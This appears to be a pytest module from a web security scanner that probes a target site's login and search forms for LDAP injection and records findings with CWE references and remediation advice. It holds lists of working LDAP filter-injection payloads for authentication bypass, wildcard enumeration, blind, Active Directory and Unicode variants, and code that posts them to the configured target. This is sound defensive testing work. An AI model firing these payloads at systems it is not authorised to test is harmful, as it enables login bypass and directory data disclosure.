"""
LDAP Injection Tests

Tests for LDAP injection attacks including:
- Authentication bypass
- Information disclosure
- Filter bypass
- Blind LDAP injection
"""

import pytest

from utils.scanner import SecurityScanner, Finding, Severity, extract_forms

# LDAP injection payloads
LDAP_WILDCARD_PAYLOADS = [
    "*)(uid=*))",
    "*)(|(objectClass=*))",
    "*)(|(userPassword=*))",
    "*)(|(cn=*))",
    "*)(&(uid=*))",
]

LDAP_FILTER_PAYLOADS = [
    "*)(|(objectClass=*))",
    "*)(|(cn=*))",
    "*)(|(uid=*))",
    "*)(|(mail=*))",
    "*)(|(sn=*))",
    "*))(|(objectClass=*",
]

LDAP_ENUM_PAYLOADS = [
    "*)(uid=*))",
    "*)(cn=*))",
    "*)(mail=*))",
    "*)(objectClass=*))",
    "admin*",
    "*admin*",
]

LDAP_BLIND_PAYLOADS = [
    "*)(|(objectClass=*))",
    "*)(|(cn=*))",
    "*))%00",
    "*))(cn=*",
]

LDAP_AD_PAYLOADS = [
    "*)(sAMAccountName=*))",
    "*)(userPrincipalName=*))",
    "*)(servicePrincipalName=*))",
    "*)(memberOf=*))",
    "*)(adminCount=1))",
]

LDAP_UNICODE_PAYLOADS = [
    "*)\u0000(uid=*)",
    "*)\u200b(cn=*)",  # Zero-width space
    "admin\uff0a",  # Fullwidth asterisk
]


@pytest.fixture
def ldap_scanner(test_config):
    """Create scanner for LDAP tests."""
    return SecurityScanner(test_config)


class TestLDAPInjection:
    """LDAP injection test suite."""

    def _check_ldap_injection(self, response_text, payload, test_url):
        """Check if LDAP injection was successful and return Finding if so."""
        ldap_success = ["root", "admin", "administrator", "uid=", "cn=", "dn=", "objectclass", "memberof"]

        for indicator in ldap_success:
            if indicator in response_text.lower():
                return Finding(
                    title="LDAP Injection Successful",
                    severity=Severity.HIGH,
                    description=f"LDAP injection successful - {payload}",
                    url=test_url,
                    evidence=f"LDAP indicator found: {indicator}",
                    remediation="Sanitize LDAP queries. Use parameterized queries. Escape special characters.",
                    cwe_id="CWE-90",
                    owasp_category="A03:2021 - Injection",
                )
        return None

    def _find_login_forms(self, forms):
        """Find forms that look like login forms."""
        login_forms = []
        for form in forms[:5]:
            for inp in form.get("inputs", []):
                name = inp.get("name", "").lower()
                if "username" in name or "user" in name or "email" in name or "password" in name:
                    login_forms.append(form)
                    break
        return login_forms[:3]

    def _find_search_forms(self, forms):
        """Find forms that look like search forms."""
        search_forms = []
        for form in forms[:5]:
            for inp in form.get("inputs", []):
                name = inp.get("name", "").lower()
                if "search" in name or "query" in name or "filter" in name or "user" in name:
                    search_forms.append(form)
                    break
        return search_forms[:3]

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_wildcard_bypass(self, ldap_scanner, target_url, findings_collector):
        """Test for LDAP wildcard authentication bypass."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        login_forms = self._find_login_forms(forms)

        for form in login_forms:
            user_field = None
            pass_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "username" in name or "user" in name:
                    user_field = inp["name"]
                elif "password" in name:
                    pass_field = inp["name"]

            if user_field:
                for payload in LDAP_WILDCARD_PAYLOADS:
                    form_data = {user_field: payload}
                    if pass_field:
                        form_data[pass_field] = "test123"

                    resp = ldap_scanner.post(form["action"], data=form_data)

                    if resp:
                        finding = self._check_ldap_injection(resp.text, payload, form["action"])
                        if finding:
                            findings_collector.add(finding)
                            ldap_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_filter_bypass(self, ldap_scanner, target_url, findings_collector):
        """Test for LDAP filter bypass techniques."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "filter" in name:
                    for payload in LDAP_FILTER_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = ldap_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_ldap_injection(resp.text, payload, form["action"])
                            if finding:
                                findings_collector.add(finding)
                                ldap_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_enumeration(self, ldap_scanner, target_url, findings_collector):
        """Test for LDAP enumeration attacks."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "user" in name:
                    for payload in LDAP_ENUM_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = ldap_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()

                            if "admin" in text or "root" in text or "uid=" in text or "cn=" in text:
                                finding = Finding(
                                    title="LDAP Enumeration via Wildcard",
                                    severity=Severity.MEDIUM,
                                    description=f"LDAP enumeration possible via wildcard injection - {payload}",
                                    url=form["action"],
                                    evidence=f"User info found in response: {text[:200]}",
                                    remediation="Restrict LDAP search queries. Use proper access controls. Avoid wildcards in user input.",
                                    cwe_id="CWE-204",
                                    owasp_category="A01:2021 - Broken Access Control",
                                )
                                findings_collector.add(finding)
                                ldap_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_blind_injection(self, ldap_scanner, target_url, findings_collector):
        """Test for blind LDAP injection."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        login_forms = self._find_login_forms(forms)

        for form in login_forms:
            user_field = None
            pass_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "username" in name or "email" in name:
                    user_field = inp["name"]
                elif "password" in name:
                    pass_field = inp["name"]

            if user_field:
                for payload in LDAP_BLIND_PAYLOADS:
                    form_data = {user_field: payload}
                    if pass_field:
                        form_data[pass_field] = "test123"

                    resp = ldap_scanner.post(form["action"], data=form_data)

                    if resp:
                        finding = self._check_ldap_injection(resp.text, payload, form["action"])
                        if finding:
                            findings_collector.add(finding)
                            ldap_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_comment_injection(self, ldap_scanner, target_url, findings_collector):
        """Test for LDAP comment character injection."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        comment_payloads = [
            "*)(%00))",
            "*)(|(objectClass=*))",
            "admin)(|(cn=*))",
            "*))%00",
        ]

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "user" in name:
                    for payload in comment_payloads:
                        form_data = {inp["name"]: payload}

                        resp = ldap_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_ldap_injection(resp.text, payload, form["action"])
                            if finding:
                                findings_collector.add(finding)
                                ldap_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_active_directory(self, ldap_scanner, target_url, findings_collector):
        """Test for Active Directory specific LDAP injection."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "user" in name:
                    for payload in LDAP_AD_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = ldap_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()
                            ad_indicators = ["samaccountname", "userprincipalname", "memberof", "admincount", "dc="]

                            for indicator in ad_indicators:
                                if indicator in text:
                                    finding = Finding(
                                        title="Active Directory LDAP Injection",
                                        severity=Severity.HIGH,
                                        description=f"AD-specific LDAP injection - {payload}",
                                        url=form["action"],
                                        evidence=f"AD attribute found: {indicator}",
                                        remediation="Sanitize LDAP queries. Use parameterized queries. Implement proper access controls.",
                                        cwe_id="CWE-90",
                                        owasp_category="A03:2021 - Injection",
                                    )
                                    findings_collector.add(finding)
                                    ldap_scanner.add_finding(finding)
                                    return

    @pytest.mark.security
    @pytest.mark.ldap_injection
    def test_ldap_unicode_bypass(self, ldap_scanner, target_url, findings_collector):
        """Test for Unicode-based LDAP filter bypass."""
        resp = ldap_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        login_forms = self._find_login_forms(forms)

        for form in login_forms:
            user_field = None
            pass_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "username" in name or "user" in name:
                    user_field = inp["name"]
                elif "password" in name:
                    pass_field = inp["name"]

            if user_field:
                for payload in LDAP_UNICODE_PAYLOADS:
                    form_data = {user_field: payload}
                    if pass_field:
                        form_data[pass_field] = "test123"

                    try:
                        resp = ldap_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_ldap_injection(resp.text, payload, form["action"])
                            if finding:
                                finding.title = "LDAP Unicode Bypass"
                                finding.description = f"Unicode-based LDAP filter bypass - {repr(payload)}"
                                findings_collector.add(finding)
                                ldap_scanner.add_finding(finding)
                                return
                    except Exception:
                        pass
